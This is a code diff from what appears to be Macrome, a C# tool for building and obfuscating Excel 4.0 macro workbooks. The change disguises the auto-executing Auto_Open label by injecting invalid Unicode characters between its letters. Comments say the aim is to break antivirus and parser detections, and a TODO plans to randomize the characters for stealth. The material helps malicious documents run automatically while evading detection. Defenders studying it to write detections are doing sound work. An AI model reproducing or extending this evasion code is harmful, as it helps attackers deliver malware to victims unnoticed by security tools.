@@ -227,14 +227,10 @@ namespace Macrome
             List<Lbl> autoOpenLabels = new List<Lbl>();
             foreach (var label in labels)
             {
-                string normalizedName;
-                if (label.Name.fHighByte)
+                string normalizedName = "";
+                foreach (char c in label.Name.Value)
                 {
-                    normalizedName = label.Name.Value.Replace("\u0000", "");
-                }
-                else
-                {
-                    normalizedName = label.Name.Value.Replace("\0", "");
+                    if ((int)c >= 0x20 && (int)c < 0x7F) normalizedName += c;
                 }
                 
                 if (normalizedName.ToLowerInvariant().StartsWith("auto_open"))
@@ -255,7 +251,7 @@ namespace Macrome
         /// 2) The string we use for the Lbl can be Unicode, which will further break signatures expecting an ASCII Auto_Open string
         /// 3) We can inject null bytes into the label name and Excel will ignore them when hunting for Auto_Open labels.
         ///    The name manager will only display up to the first null byte - and most excel label parsers will also break on this.
-        /// 4) The Unicode BOM character (0xFEFF) is also disregarded by Excel. We can use this to break detections that will drop
+        /// 4) The Unicode BOM character (0xFEFF/0xFFEF) is also disregarded by Excel. We can use this to break detections that will drop
         ///    nulls and look for Auto_Open without being case sensitive. By injecting this with nulls we break most detection.
         /// </summary>
         /// <returns></returns>
@@ -265,8 +261,16 @@ namespace Macrome
             Lbl autoOpenLbl = labels.First(l => l.fBuiltin && l.Name.Value.Equals("\u0001") ||
                                                 l.Name.Value.ToLower().StartsWith("auto_open"));
             Lbl replaceLabelStringLbl = ((BiffRecord)autoOpenLbl.Clone()).AsRecordType<Lbl>();
-            replaceLabelStringLbl.SetName(new XLUnicodeStringNoCch("\u0000A\uFEFFu\uFEFFt\uFEFFo_Open\u0000\u0000\uFEFF\u0000\u0000", true));
+
+            //Characters that work
+            //fefe, ffff, feff, fffe, ffef, fff0, fff1, fff6, fefd, 0000, dddd
+            //Pretty much any character that is invalid unicode
+            //TODO [Stealth] Randomize which invalid unicode characters are injected into this string
+            replaceLabelStringLbl.SetName(new XLUnicodeStringNoCch("\u0000\ufefeA\uffffu\ufefft\ufffeo\uffef_\ufff0O\ufff1p\ufff6e\ufefdn\udddd", true));
             replaceLabelStringLbl.fBuiltin = false;
+
+            // Hidden removes from the label manager entirely, but doesn't seem to work if fBuiltin is false
+            // replaceLabelStringLbl.fHidden = true;
 
             WorkbookStream obfuscatedStream = ReplaceRecord(autoOpenLbl, replaceLabelStringLbl);
             obfuscatedStream = obfuscatedStream.FixBoundSheetOffsets();
